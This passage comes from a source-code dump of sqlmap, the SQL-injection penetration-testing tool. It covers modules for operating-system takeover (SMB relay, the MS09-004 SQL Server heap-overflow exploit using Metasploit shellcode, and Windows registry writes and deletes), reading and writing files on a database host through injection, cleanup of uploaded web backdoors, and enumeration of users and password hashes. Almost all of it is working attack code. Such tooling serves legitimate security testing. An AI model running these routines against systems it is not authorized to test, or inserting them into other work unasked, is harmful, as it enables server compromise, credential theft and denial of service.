  if setupSuccess is not True:\n                        msg = \"unable to mount the operating system takeover\"\n                        raise SqlmapFilePathException(msg)\n\n        if setupSuccess:\n            if tunnel == 1:\n                self.pwn(goUdf)\n            elif tunnel == 2:\n                self.icmpPwn()\n        else:\n            errMsg = \"unable to prompt for an out-of-band session\"\n            raise SqlmapNotVulnerableException(errMsg)\n\n        if not conf.cleanup:\n            self.cleanup(web=web)\n\n    def osSmb(self):\n        self.checkDbmsOs()\n\n        if not Backend.isOs(OS.WINDOWS):\n            errMsg = \"the back-end DBMS underlying operating system is \"\n            errMsg += \"not Windows: it is not possible to perform the SMB \"\n            errMsg += \"relay attack\"\n            raise SqlmapUnsupportedDBMSException(errMsg)\n\n        if not isStackingAvailable() and not conf.direct:\n            if Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.MSSQL):\n                errMsg = \"on this back-end DBMS it is only possible to \"\n                errMsg += \"perform the SMB relay attack if stacked \"\n                errMsg += \"queries are supported\"\n                raise SqlmapUnsupportedDBMSException(errMsg)\n\n            elif Backend.isDbms(DBMS.MYSQL):\n                debugMsg = \"since stacked queries are not supported, \"\n                debugMsg += \"sqlmap is going to perform the SMB relay \"\n                debugMsg += \"attack via inference blind SQL injection\"\n                logger.debug(debugMsg)\n\n        printWarn = True\n        warnMsg = \"it is unlikely that this attack will be successful \"\n\n        if Backend.isDbms(DBMS.MYSQL):\n            warnMsg += \"because by default MySQL on Windows runs as \"\n            warnMsg += \"Local System which is not a real user, it does \"\n            warnMsg += \"not send the NTLM session hash when connecting to \"\n            warnMsg += \"a SMB service\"\n\n        elif Backend.isDbms(DBMS.PGSQL):\n            warnMsg += \"because by default PostgreSQL on Windows runs \"\n            warnMsg += \"as postgres user which is a real user of the \"\n            warnMsg += \"system, but not within the Administrators group\"\n\n        elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin((\"2005\", \"2008\")):\n            warnMsg += \"because often Microsoft SQL Server %s \" % Backend.getVersion()\n            warnMsg += \"runs as Network Service which is not a real user, \"\n            warnMsg += \"it does not send the NTLM session hash when \"\n            warnMsg += \"connecting to a SMB service\"\n\n        else:\n            printWarn = False\n\n        if printWarn:\n            logger.warning(warnMsg)\n\n        self.smb()\n\n    def osBof(self):\n        if not isStackingAvailable() and not conf.direct:\n            return\n\n        if not Backend.isDbms(DBMS.MSSQL) or not Backend.isVersionWithin((\"2000\", \"2005\")):\n            errMsg = \"the back-end DBMS must be Microsoft SQL Server \"\n            errMsg += \"2000 or 2005 to be able to exploit the heap-based \"\n            errMsg += \"buffer overflow in the 'sp_replwritetovarbin' \"\n            errMsg += \"stored procedure (MS09-004)\"\n            raise SqlmapUnsupportedDBMSException(errMsg)\n\n        infoMsg = \"going to exploit the Microsoft SQL Server %s \" % Backend.getVersion()\n        infoMsg += \"'sp_replwritetovarbin' stored procedure heap-based \"\n        infoMsg += \"buffer overflow (MS09-004)\"\n        logger.info(infoMsg)\n\n        msg = \"this technique is likely to DoS the DBMS process, are you \"\n        msg += \"sure that you want to carry with the exploit? [y/N] \"\n\n        if readInput(msg, default='N', boolean=True):\n            self.initEnv(mandatory=False, detailed=True)\n            self.getRemoteTempPath()\n            self.createMsfShellcode(exitfunc=\"seh\", format=\"raw\", extra=\"-b 27\", encode=True)\n            self.bof()\n\n    def uncPathRequest(self):\n        errMsg = \"'uncPathRequest' method must be defined \"\n        errMsg += \"into the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n\n    def _regInit(self):\n        if not isStackingAvailable() and not conf.direct:\n            return\n\n        self.checkDbmsOs()\n\n        if not Backend.isOs(OS.WINDOWS):\n            errMsg = \"the back-end DBMS underlying operating system is \"\n            errMsg += \"not Windows\"\n            raise SqlmapUnsupportedDBMSException(errMsg)\n\n        self.initEnv()\n        self.getRemoteTempPath()\n\n    def regRead(self):\n        self._regInit()\n\n        if not conf.regKey:\n            default = \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\"\n            msg = \"which registry key do you want to read? [%s] \" % default\n            regKey = readInput(msg, default=default)\n        else:\n            regKey = conf.regKey\n\n        if not conf.regVal:\n            default = \"ProductName\"\n            msg = \"which registry key value do you want to read? [%s] \" % default\n            regVal = readInput(msg, default=default)\n        else:\n            regVal = conf.regVal\n\n        infoMsg = \"reading Windows registry path '%s\\\\%s' \" % (regKey, regVal)\n        logger.info(infoMsg)\n\n        return self.readRegKey(regKey, regVal, True)\n\n    def regAdd(self):\n        self._regInit()\n\n        errMsg = \"missing mandatory option\"\n\n        if not conf.regKey:\n            msg = \"which registry key do you want to write? \"\n            regKey = readInput(msg)\n\n            if not regKey:\n                raise SqlmapMissingMandatoryOptionException(errMsg)\n        else:\n            regKey = conf.regKey\n\n        if not conf.regVal:\n            msg = \"which registry key value do you want to write? \"\n            regVal = readInput(msg)\n\n            if not regVal:\n                raise SqlmapMissingMandatoryOptionException(errMsg)\n        else:\n            regVal = conf.regVal\n\n        if not conf.regData:\n            msg = \"which registry key value data do you want to write? \"\n            regData = readInput(msg)\n\n            if not regData:\n                raise SqlmapMissingMandatoryOptionException(errMsg)\n        else:\n            regData = conf.regData\n\n        if not conf.regType:\n            default = \"REG_SZ\"\n            msg = \"which registry key value data-type is it? \"\n            msg += \"[%s] \" % default\n            regType = readInput(msg, default=default)\n        else:\n            regType = conf.regType\n\n        infoMsg = \"adding Windows registry path '%s\\\\%s' \" % (regKey, regVal)\n        infoMsg += \"with data '%s'. \" % regData\n        infoMsg += \"This will work only if the user running the database \"\n        infoMsg += \"process has privileges to modify the Windows registry.\"\n        logger.info(infoMsg)\n\n        self.addRegKey(regKey, regVal, regType, regData)\n\n    def regDel(self):\n        self._regInit()\n\n        errMsg = \"missing mandatory option\"\n\n        if not conf.regKey:\n            msg = \"which registry key do you want to delete? \"\n            regKey = readInput(msg)\n\n            if not regKey:\n                raise SqlmapMissingMandatoryOptionException(errMsg)\n        else:\n            regKey = conf.regKey\n\n        if not conf.regVal:\n            msg = \"which registry key value do you want to delete? \"\n            regVal = readInput(msg)\n\n            if not regVal:\n                raise SqlmapMissingMandatoryOptionException(errMsg)\n        else:\n            regVal = conf.regVal\n\n        message = \"are you sure that you want to delete the Windows \"\n        message += \"registry path '%s\\\\%s? [y/N] \" % (regKey, regVal)\n\n        if not readInput(message, default='N', boolean=True):\n            return\n\n        infoMsg = \"deleting Windows registry path '%s\\\\%s'. \" % (regKey, regVal)\n        infoMsg += \"This will work only if the user running the database \"\n        infoMsg += \"process has privileges to modify the Windows registry.\"\n        logger.info(infoMsg)\n\n        self.delRegKey(regKey, regVal)\n", "plugins/generic/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport codecs\nimport os\nimport sys\n\nfrom lib.core.agent import agent\nfrom lib.core.common import Backend\nfrom lib.core.common import checkFile\nfrom lib.core.common import dataToOutFile\nfrom lib.core.common import decloakToTemp\nfrom lib.core.common import decodeDbmsHexValue\nfrom lib.core.common import isListLike\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import isStackingAvailable\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import readInput\nfrom lib.core.compat import xrange\nfrom lib.core.convert import encodeBase64\nfrom lib.core.convert import encodeHex\nfrom lib.core.convert import getText\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapUndefinedMethod\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.request import inject\n\nclass Filesystem(object):\n    \"\"\"\n    This class defines generic OS file system functionalities for plugins.\n    \"\"\"\n\n    def __init__(self):\n        self.fileTblName = \"%sfile\" % conf.tablePrefix\n        self.tblField = \"data\"\n\n    def _checkFileLength(self, localFile, remoteFile, fileRead=False):\n        if Backend.isDbms(DBMS.MYSQL):\n            lengthQuery = \"LENGTH(LOAD_FILE('%s'))\" % remoteFile\n\n        elif Backend.isDbms(DBMS.PGSQL) and not fileRead:\n            lengthQuery = \"SELECT SUM(LENGTH(data)) FROM pg_largeobject WHERE loid=%d\" % self.oid\n\n        elif Backend.isDbms(DBMS.MSSQL):\n            self.createSupportTbl(self.fileTblName, self.tblField, \"VARBINARY(MAX)\")\n            inject.goStacked(\"INSERT INTO %s(%s) SELECT %s FROM OPENROWSET(BULK '%s', SINGLE_BLOB) AS %s(%s)\" % (self.fileTblName, self.tblField, self.tblField, remoteFile, self.fileTblName, self.tblField))\n\n            lengthQuery = \"SELECT DATALENGTH(%s) FROM %s\" % (self.tblField, self.fileTblName)\n\n        try:\n            localFileSize = os.path.getsize(localFile)\n        except OSError:\n            warnMsg = \"file '%s' is missing\" % localFile\n            logger.warning(warnMsg)\n            localFileSize = 0\n\n        if fileRead and Backend.isDbms(DBMS.PGSQL):\n            logger.info(\"length of read file '%s' cannot be checked on PostgreSQL\" % remoteFile)\n            sameFile = True\n        else:\n            logger.debug(\"checking the length of the remote file '%s'\" % remoteFile)\n            remoteFileSize = inject.getValue(lengthQuery, resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n            sameFile = None\n\n            if isNumPosStrValue(remoteFileSize):\n                remoteFileSize = int(remoteFileSize)\n                localFile = getUnicode(localFile, encoding=sys.getfilesystemencoding() or UNICODE_ENCODING)\n                sameFile = False\n\n                if localFileSize == remoteFileSize:\n                    sameFile = True\n                    infoMsg = \"the local file '%s' and the remote file \" % localFile\n                    infoMsg += \"'%s' have the same size (%d B)\" % (remoteFile, localFileSize)\n                elif remoteFileSize > localFileSize:\n                    infoMsg = \"the remote file '%s' is larger (%d B) than \" % (remoteFile, remoteFileSize)\n                    infoMsg += \"the local file '%s' (%dB)\" % (localFile, localFileSize)\n                else:\n                    infoMsg = \"the remote file '%s' is smaller (%d B) than \" % (remoteFile, remoteFileSize)\n                    infoMsg += \"file '%s' (%d B)\" % (localFile, localFileSize)\n\n                logger.info(infoMsg)\n            else:\n                sameFile = False\n                warnMsg = \"it looks like the file has not been written (usually \"\n                warnMsg += \"occurs if the DBMS process user has no write \"\n                warnMsg += \"privileges in the destination path)\"\n                logger.warning(warnMsg)\n\n        return sameFile\n\n    def fileToSqlQueries(self, fcEncodedList):\n        \"\"\"\n        Called by MySQL and PostgreSQL plugins to write a file on the\n        back-end DBMS underlying file system\n        \"\"\"\n\n        counter = 0\n        sqlQueries = []\n\n        for fcEncodedLine in fcEncodedList:\n            if counter == 0:\n                sqlQueries.append(\"INSERT INTO %s(%s) VALUES (%s)\" % (self.fileTblName, self.tblField, fcEncodedLine))\n            else:\n                updatedField = agent.simpleConcatenate(self.tblField, fcEncodedLine)\n                sqlQueries.append(\"UPDATE %s SET %s=%s\" % (self.fileTblName, self.tblField, updatedField))\n\n            counter += 1\n\n        return sqlQueries\n\n    def fileEncode(self, fileName, encoding, single, chunkSize=256):\n        \"\"\"\n        Called by MySQL and PostgreSQL plugins to write a file on the\n        back-end DBMS underlying file system\n        \"\"\"\n\n        checkFile(fileName)\n\n        with open(fileName, \"rb\") as f:\n            content = f.read()\n\n        return self.fileContentEncode(content, encoding, single, chunkSize)\n\n    def fileContentEncode(self, content, encoding, single, chunkSize=256):\n        retVal = []\n\n        if encoding == \"hex\":\n            content = encodeHex(content)\n        elif encoding == \"base64\":\n            content = encodeBase64(content)\n        else:\n            content = codecs.encode(content, encoding)\n\n        content = getText(content).replace(\"\\n\", \"\")\n\n        if not single:\n            if len(content) > chunkSize:\n                for i in xrange(0, len(content), chunkSize):\n                    _ = content[i:i + chunkSize]\n\n                    if encoding == \"hex\":\n                        _ = \"0x%s\" % _\n                    elif encoding == \"base64\":\n                        _ = \"'%s'\" % _\n\n                    retVal.append(_)\n\n        if not retVal:\n            if encoding == \"hex\":\n                content = \"0x%s\" % content\n            elif encoding == \"base64\":\n                content = \"'%s'\" % content\n\n            retVal = [content]\n\n        return retVal\n\n    def askCheckWrittenFile(self, localFile, remoteFile, forceCheck=False):\n        choice = None\n\n        if forceCheck is not True:\n            message = \"do you want confirmation that the local file '%s' \" % localFile\n            message += \"has been successfully written on the back-end DBMS \"\n            message += \"file system ('%s')? [Y/n] \" % remoteFile\n            choice = readInput(message, default='Y', boolean=True)\n\n        if forceCheck or choice:\n            return self._checkFileLength(localFile, remoteFile)\n\n        return True\n\n    def askCheckReadFile(self, localFile, remoteFile):\n        if not kb.bruteMode:\n            message = \"do you want confirmation that the remote file '%s' \" % remoteFile\n            message += \"has been successfully downloaded from the back-end \"\n            message += \"DBMS file system? [Y/n] \"\n\n            if readInput(message, default='Y', boolean=True):\n                return self._checkFileLength(localFile, remoteFile, True)\n\n        return None\n\n    def nonStackedReadFile(self, remoteFile):\n        errMsg = \"'nonStackedReadFile' method must be defined \"\n        errMsg += \"into the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n\n    def stackedReadFile(self, remoteFile):\n        errMsg = \"'stackedReadFile' method must be defined \"\n        errMsg += \"into the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n\n    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):\n        errMsg = \"'unionWriteFile' method must be defined \"\n        errMsg += \"into the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n\n    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):\n        errMsg = \"'stackedWriteFile' method must be defined \"\n        errMsg += \"into the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n\n    def readFile(self, remoteFile):\n        localFilePaths = []\n\n        self.checkDbmsOs()\n\n        for remoteFile in remoteFile.split(','):\n            fileContent = None\n            kb.fileReadMode = True\n\n            if conf.direct or isStackingAvailable():\n                if isStackingAvailable():\n                    debugMsg = \"going to try to read the file with stacked query SQL \"\n                    debugMsg += \"injection technique\"\n                    logger.debug(debugMsg)\n\n                fileContent = self.stackedReadFile(remoteFile)\n            elif Backend.isDbms(DBMS.MYSQL):\n                debugMsg = \"going to try to read the file with non-stacked query \"\n                debugMsg += \"SQL injection technique\"\n                logger.debug(debugMsg)\n\n                fileContent = self.nonStackedReadFile(remoteFile)\n            else:\n                errMsg = \"none of the SQL injection techniques detected can \"\n                errMsg += \"be used to read files from the underlying file \"\n                errMsg += \"system of the back-end %s server\" % Backend.getDbms()\n                logger.error(errMsg)\n\n                fileContent = None\n\n            kb.fileReadMode = False\n\n            if fileContent in (None, \"\") and not Backend.isDbms(DBMS.PGSQL):\n                self.cleanup(onlyFileTbl=True)\n            elif isListLike(fileContent):\n                newFileContent = \"\"\n\n                for chunk in fileContent:\n                    if isListLike(chunk):\n                        if len(chunk) > 0:\n                            chunk = chunk[0]\n                        else:\n                            chunk = \"\"\n\n                    if chunk:\n                        newFileContent += chunk\n\n                fileContent = newFileContent\n\n            if fileContent is not None:\n                fileContent = decodeDbmsHexValue(fileContent, True)\n\n                if fileContent.strip():\n                    localFilePath = dataToOutFile(remoteFile, fileContent)\n\n                    if not Backend.isDbms(DBMS.PGSQL):\n                        self.cleanup(onlyFileTbl=True)\n\n                    sameFile = self.askCheckReadFile(localFilePath, remoteFile)\n\n                    if sameFile is True:\n                        localFilePath += \" (same file)\"\n                    elif sameFile is False:\n                        localFilePath += \" (size differs from remote file)\"\n\n                    localFilePaths.append(localFilePath)\n                elif not kb.bruteMode:\n                    errMsg = \"no data retrieved\"\n                    logger.error(errMsg)\n\n        return localFilePaths\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        written = False\n\n        checkFile(localFile)\n\n        self.checkDbmsOs()\n\n        if localFile.endswith('_'):\n            localFile = getUnicode(decloakToTemp(localFile))\n\n        if conf.direct or isStackingAvailable():\n            if isStackingAvailable():\n                debugMsg = \"going to upload the file '%s' with \" % fileType\n                debugMsg += \"stacked query technique\"\n                logger.debug(debugMsg)\n\n            written = self.stackedWriteFile(localFile, remoteFile, fileType, forceCheck)\n            self.cleanup(onlyFileTbl=True)\n        elif isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) and Backend.isDbms(DBMS.MYSQL):\n            debugMsg = \"going to upload the file '%s' with \" % fileType\n            debugMsg += \"UNION query technique\"\n            logger.debug(debugMsg)\n\n            written = self.unionWriteFile(localFile, remoteFile, fileType, forceCheck)\n        elif Backend.isDbms(DBMS.MYSQL):\n            debugMsg = \"going to upload the file '%s' with \" % fileType\n            debugMsg += \"LINES TERMINATED BY technique\"\n            logger.debug(debugMsg)\n\n            written = self.linesTerminatedWriteFile(localFile, remoteFile, fileType, forceCheck)\n        else:\n            errMsg = \"none of the SQL injection techniques detected can \"\n            errMsg += \"be used to write files to the underlying file \"\n            errMsg += \"system of the back-end %s server\" % Backend.getDbms()\n            logger.error(errMsg)\n\n            return None\n\n        return written\n", "plugins/generic/misc.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport ntpath\nimport re\n\nfrom lib.core.common import Backend\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import isStackingAvailable\nfrom lib.core.common import normalizePath\nfrom lib.core.common import ntToPosixSlashes\nfrom lib.core.common import posixToNtSlashes\nfrom lib.core.common import readInput\nfrom lib.core.common import singleTimeDebugMessage\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import OS\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.request import inject\n\nclass Miscellaneous(object):\n    \"\"\"\n    This class defines miscellaneous functionalities for plugins.\n    \"\"\"\n\n    def __init__(self):\n        pass\n\n    def getRemoteTempPath(self):\n        if not conf.tmpPath and Backend.isDbms(DBMS.MSSQL):\n            debugMsg = \"identifying Microsoft SQL Server error log directory \"\n            debugMsg += \"that sqlmap will use to store temporary files with \"\n            debugMsg += \"commands' output\"\n            logger.debug(debugMsg)\n\n            _ = unArrayizeValue(inject.getValue(\"SELECT SERVERPROPERTY('ErrorLogFileName')\", safeCharEncode=False))\n\n            if _:\n                conf.tmpPath = ntpath.dirname(_)\n\n        if not conf.tmpPath:\n            if Backend.isOs(OS.WINDOWS):\n                if conf.direct:\n                    conf.tmpPath = \"%TEMP%\"\n                else:\n                    self.checkDbmsOs(detailed=True)\n\n                    if Backend.getOsVersion() in (\"2000\", \"NT\"):\n                        conf.tmpPath = \"C:/WINNT/Temp\"\n                    elif Backend.isOs(\"XP\"):\n                        conf.tmpPath = \"C:/Documents and Settings/All Users/Application Data/Temp\"\n                    else:\n                        conf.tmpPath = \"C:/Windows/Temp\"\n            else:\n                conf.tmpPath = \"/tmp\"\n\n        if re.search(r\"\\A[\\w]:[\\/\\\\]+\", conf.tmpPath, re.I):\n            Backend.setOs(OS.WINDOWS)\n\n        conf.tmpPath = normalizePath(conf.tmpPath)\n        conf.tmpPath = ntToPosixSlashes(conf.tmpPath)\n\n        singleTimeDebugMessage(\"going to use '%s' as temporary files directory\" % conf.tmpPath)\n\n        hashDBWrite(HASHDB_KEYS.CONF_TMP_PATH, conf.tmpPath)\n\n        return conf.tmpPath\n\n    def getVersionFromBanner(self):\n        if \"dbmsVersion\" in kb.bannerFp:\n            return\n\n        infoMsg = \"detecting back-end DBMS version from its banner\"\n        logger.info(infoMsg)\n\n        query = queries[Backend.getIdentifiedDbms()].banner.query\n\n        if conf.direct:\n            query = \"SELECT %s\" % query\n\n        kb.bannerFp[\"dbmsVersion\"] = unArrayizeValue(inject.getValue(query)) or \"\"\n\n        match = re.search(r\"\\d[\\d.-]*\", kb.bannerFp[\"dbmsVersion\"])\n        if match:\n            kb.bannerFp[\"dbmsVersion\"] = match.group(0)\n\n    def delRemoteFile(self, filename):\n        if not filename:\n            return\n\n        self.checkDbmsOs()\n\n        if Backend.isOs(OS.WINDOWS):\n            filename = posixToNtSlashes(filename)\n            cmd = \"del /F /Q %s\" % filename\n        else:\n            cmd = \"rm -f %s\" % filename\n\n        self.execCmd(cmd, silent=True)\n\n    def createSupportTbl(self, tblName, tblField, tblType):\n        inject.goStacked(\"DROP TABLE %s\" % tblName, silent=True)\n\n        if Backend.isDbms(DBMS.MSSQL) and tblName == self.cmdTblName:\n            inject.goStacked(\"CREATE TABLE %s(id INT PRIMARY KEY IDENTITY, %s %s)\" % (tblName, tblField, tblType))\n        else:\n            inject.goStacked(\"CREATE TABLE %s(%s %s)\" % (tblName, tblField, tblType))\n\n    def cleanup(self, onlyFileTbl=False, udfDict=None, web=False):\n        \"\"\"\n        Cleanup file system and database from sqlmap create files, tables\n        and functions\n        \"\"\"\n\n        if web and self.webBackdoorFilePath:\n            logger.info(\"cleaning up the web files uploaded\")\n\n            self.delRemoteFile(self.webStagerFilePath)\n            self.delRemoteFile(self.webBackdoorFilePath)\n\n        if (not isStackingAvailable() or kb.udfFail) and not conf.direct:\n            return\n\n        if any((conf.osCmd, conf.osShell)) and Backend.isDbms(DBMS.PGSQL) and kb.copyExecTest:\n            return\n\n        if Backend.isOs(OS.WINDOWS):\n            libtype = \"dynamic-link library\"\n\n        elif Backend.isOs(OS.LINUX):\n            libtype = \"shared object\"\n\n        else:\n            libtype = \"shared library\"\n\n        if onlyFileTbl:\n            logger.debug(\"cleaning up the database management system\")\n        else:\n            logger.info(\"cleaning up the database management system\")\n\n        logger.debug(\"removing support tables\")\n        inject.goStacked(\"DROP TABLE %s\" % self.fileTblName, silent=True)\n        inject.goStacked(\"DROP TABLE %shex\" % self.fileTblName, silent=True)\n\n        if not onlyFileTbl:\n            inject.goStacked(\"DROP TABLE %s\" % self.cmdTblName, silent=True)\n\n            if Backend.isDbms(DBMS.MSSQL):\n                udfDict = {\"master..new_xp_cmdshell\": {}}\n\n            if udfDict is None:\n                udfDict = getattr(self, \"sysUdfs\", {})\n\n            for udf, inpRet in udfDict.items():\n                message = \"do you want to remove UDF '%s'? [Y/n] \" % udf\n\n                if readInput(message, default='Y', boolean=True):\n                    dropStr = \"DROP FUNCTION %s\" % udf\n\n                    if Backend.isDbms(DBMS.PGSQL):\n                        inp = \", \".join(i for i in inpRet[\"input\"])\n                        dropStr += \"(%s)\" % inp\n\n                    logger.debug(\"removing UDF '%s'\" % udf)\n                    inject.goStacked(dropStr, silent=True)\n\n            logger.info(\"database management system cleanup finished\")\n\n            warnMsg = \"remember that UDF %s files \" % libtype\n\n            if conf.osPwn:\n                warnMsg += \"and Metasploit related files in the temporary \"\n                warnMsg += \"folder \"\n\n            warnMsg += \"saved on the file system can only be deleted \"\n            warnMsg += \"manually\"\n            logger.warning(warnMsg)\n\n    def likeOrExact(self, what):\n        message = \"do you want sqlmap to consider provided %s(s):\\n\" % what\n        message += \"[1] as LIKE %s names (default)\\n\" % what\n        message += \"[2] as exact %s names\" % what\n\n        choice = readInput(message, default='1')\n\n        if not choice or choice == '1':\n            choice = '1'\n            condParam = \" LIKE '%%%s%%'\"\n        elif choice == '2':\n            condParam = \"='%s'\"\n        else:\n            errMsg = \"invalid value\"\n            raise SqlmapNoneDataException(errMsg)\n\n        return choice, condParam\n", "plugins/generic/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "plugins/generic/users.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.agent import agent\nfrom lib.core.common import arrayizeValue\nfrom lib.core.common import Backend\nfrom lib.core.common import filterPairValues\nfrom lib.core.common import getLimitRange\nfrom lib.core.common import isAdminFromPrivileges\nfrom lib.core.common import isInferenceAvailable\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import isNullValue\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import parsePasswordHash\nfrom lib.core.common import readInput\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.compat import xrange\nfrom lib.core.convert import encodeHex\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.dicts import DB2_PRIVS\nfrom lib.core.dicts import FIREBIRD_PRIVS\nfrom lib.core.dicts import INFORMIX_PRIVS\nfrom lib.core.dicts import MYSQL_PRIVS\nfrom lib.core.dicts import PGSQL_PRIVS\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import FORK\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.settings import CURRENT_USER\nfrom lib.core.settings import PLUS_ONE_DBMSES\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.request import inject\nfrom lib.utils.hash import attackCachedUsersPasswords\nfrom lib.utils.hash import storeHashesToFile\nfrom lib.utils.pivotdumptable import pivotDumpTable\nfrom thirdparty.six.moves import zip as _zip\n\nclass Users(object):\n    \"\"\"\n    This class defines users' enumeration functionalities for plugins.\n    \"\"\"\n\n    def __init__(self):\n        kb.data.currentUser = \"\"\n        kb.data.isDba = None\n        kb.data.cachedUsers = []\n        kb.data.cachedUsersPasswords = {}\n        kb.data.cachedUsersPrivileges = {}\n        kb.data.cachedUsersRoles = {}\n\n    def getCurrentUser(self):\n        infoMsg = \"fetching current user\"\n        logger.info(infoMsg)\n\n        query = queries[Backend.getIdentifiedDbms()].current_user.query\n\n        if not kb.data.currentUser:\n            kb.data.currentUser = unArrayizeValue(inject.getValue(query))\n\n        return kb.data.currentUser\n\n    def isDba(self, user=None):\n        infoMsg = \"testing if current user is DBA\"\n        logger.info(infoMsg)\n\n        query = None\n\n        if Backend.isDbms(DBMS.MYSQL):\n            self.getCurrentUser()\n            if Backend.isDbms(DBMS.MYSQL) and Backend.isFork(FORK.DRIZZLE):\n                kb.data.isDba = \"root\" in (kb.data.currentUser or \"\")\n            elif kb.data.currentUser:\n                query = queries[Backend.getIdentifiedDbms()].is_dba.query % kb.data.currentUser.split(\"@\")[0]\n        elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and user is not None:\n            query = queries[Backend.getIdentifiedDbms()].is_dba.query2 % user\n        else:\n            query = queries[Backend.getIdentifiedDbms()].is_dba.query\n\n        if query:\n            query = agent.forgeCaseStatement(query)\n            kb.data.isDba = inject.checkBooleanExpression(query) or False\n\n        return kb.data.isDba\n\n    def getUsers(self):\n        infoMsg = \"fetching database users\"\n        logger.info(infoMsg)\n\n        rootQuery = queries[Backend.getIdentifiedDbms()].users\n\n        condition = (Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin((\"2005\", \"2008\")))\n        condition |= (Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema)\n\n        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n            if Backend.isDbms(DBMS.MYSQL) and Backend.isFork(FORK.DRIZZLE):\n                query = rootQuery.inband.query3\n            elif condition:\n                query = rootQuery.inband.query2\n            else:\n                query = rootQuery.inband.query\n\n            values = inject.getValue(query, blind=False, time=False)\n\n            if not isNoneValue(values):\n                kb.data.cachedUsers = []\n                for value in arrayizeValue(values):\n                    value = unArrayizeValue(value)\n                    if not isNoneValue(value):\n                        kb.data.cachedUsers.append(value)\n\n        if not kb.data.cachedUsers and isInferenceAvailable() and not conf.direct:\n            infoMsg = \"fetching number of database users\"\n            logger.info(infoMsg)\n\n            if Backend.isDbms(DBMS.MYSQL) and Backend.isFork(FORK.DRIZZLE):\n                query = rootQuery.blind.count3\n            elif condition:\n                query = rootQuery.blind.count2\n            else:\n                query = rootQuery.blind.count\n\n            count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n            if count == 0:\n                return kb.data.cachedUsers\n            elif not isNumPosStrValue(count):\n                errMsg = \"unable to retrieve the number of database users\"\n                raise SqlmapNoneDataException(errMsg)\n\n            plusOne = Backend.getIdentifiedDbms() in PLUS_ONE_DBMSES\n            indexRange = getLimitRange(count, plusOne=plusOne)\n\n            for index in indexRange:\n                if Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MAXDB):\n                    query = rootQuery.blind.query % (kb.data.cachedUsers[-1] if kb.data.cachedUsers else \" \")\n                elif Backend.isDbms(DBMS.MYSQL) and Backend.isFork(FORK.DRIZZLE):\n                    query = rootQuery.blind.query3 % index\n                elif condition:\n                    query = rootQuery.blind.query2 % index\n                else:\n                    query = rootQuery.blind.query % index\n\n                user = unArrayizeValue(inject.getValue(query, union=False, error=False))\n\n                if user:\n                    kb.data.cachedUsers.append(user)\n\n        if not kb.data.cachedUsers:\n            errMsg = \"unable to retrieve the database users\"\n            logger.error(errMsg)\n\n        return kb.data.cachedUsers\n\n    def getPasswordHashes(self):\n        infoMsg = \"fetching database users password hashes\"\n\n        rootQuery = queries[Backend.getIdentifiedDbms()].passwords\n\n        if conf.user == CURRENT_USER:\n            infoMsg += \" for current user\"\n            conf.user = self.getCurrentUser()\n\n        